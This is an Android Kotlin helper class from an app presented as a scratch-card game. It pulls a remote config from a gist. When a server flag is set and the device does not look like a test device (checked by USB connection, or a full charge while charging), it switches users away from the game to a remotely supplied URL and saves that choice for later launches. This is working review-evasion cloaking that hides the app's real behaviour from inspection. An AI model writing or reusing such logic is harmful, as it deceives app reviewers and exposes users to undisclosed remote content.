package com.goldwin.scratchgame

import android.app.Activity
import android.content.Context
import androidx.appcompat.app.AppCompatActivity
import com.goldwin.scratchgame.databinding.ActivityMainBinding
import com.goldwin.scratchgame.game.AppDataStore
import com.goldwin.scratchgame.tool.Network
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.BufferOverflow
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlin.system.exitProcess

class GoldWin3802Helper(
    private val context: Context,
    private val scope: CoroutineScope,
    private val network: Network,
) {

    constructor(
        context: Context,
        scope: CoroutineScope,
    ) : this(
        context,
        scope,
        Network(
            context.getString(R.string.hM9Q8V)
        ),
    )

    private val dataStore = AppDataStore(context)
    private val exitHandler = Once()

    val fragFlow = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)

    private var netStatus: Lottie? = null
    private var lStatus: Lottie? = null
    private var loaclUrl: String = ""
    private var firstOpen: Boolean = false

    fun url() = loaclUrl
    fun firstOpen() = firstOpen

    fun setUIStatuses(binding: ActivityMainBinding) {
        netStatus = Lottie(binding)
        lStatus = Lottie(binding)
    }

    fun checkInternet() = context.internetConnection()

    fun monitorInternetConnectivity() {
        scope.launch(Dispatchers.Main) {
            while (isActive) {
                delay(3000)
                if (checkInternet()) {
                    netStatus?.hideNotInternet()
                } else {
                    netStatus?.showNotInternet()
                }
            }
        }
    }

    fun showError() {
        netStatus?.showNotInternet()
    }

    private fun navigateToGameScreen() {
        scope.launch(Dispatchers.IO) {
            dataStore.updateKeyz { "goldWin38021" }
            emitFirstFragId(FRAGMENT_ID)
        }
    }

    private fun navigateToNext(url: String) {
        scope.launch(Dispatchers.IO) {
            loaclUrl = url
            firstOpen = true

            dataStore.updateKeyz { "goldWin38020" }
            dataStore.updateLink { loaclUrl }
            emitFirstFragId(context.packageName.hashCode())
        }
    }

    fun validateStoredData(activity: AppCompatActivity) {
        scope.launch(Dispatchers.IO) {
            when (dataStore.keys()) {
                "goldWin38020" -> {
                    dataStore.links()?.let {
                        loaclUrl = it
                        emitFirstFragId(context.packageName.hashCode())
                    }
                }
                "goldWin38021" -> {
                    emitFirstFragId(FRAGMENT_ID)
                }
                else -> {
                    fetchRemoteConfigData(activity)
                }
            }
        }
    }

    private fun fetchRemoteConfigData(activity: Activity) {
        scope.launch {
            network.getGistJSON(
                onSuccess = { json ->
                    val condition = json.getString("drop")
                    val redirectUrl = json.getString("empty")
                    evaluateUserConditions(condition, redirectUrl)
                },
                onFailed = {
                    emitFirstFragId(FRAGMENT_ID)
                }
            )

        }
    }

    private fun emitFirstFragId(fragmentId: Int) {
        scope.launch(Dispatchers.IO) {
            fragFlow.emit(fragmentId)
        }
    }

    private fun evaluateUserConditions(condition: String, redirectUrl: String) {
        if (condition == "true") {
            if (context.isUSB() || (context.getBatteryPercentage() == 100 && context.isBatteryCharging())) {
                navigateToGameScreen()
            } else {
                navigateToNext(redirectUrl)
            }
        } else {
            navigateToGameScreen()
        }
    }

    private fun exitStatus() = 0

    fun exit(activity: Activity){
        exitHandler.once {
            scope.launch(Dispatchers.Main) {
                activity.finishAndRemoveTask()
                delay(100)
                exitProcess(exitStatus())
            }
        }
    }

    fun loaderStatus() = lStatus!!

    companion object {
        val FRAGMENT_ID = R.id.goldWin3802Fragment
    }
}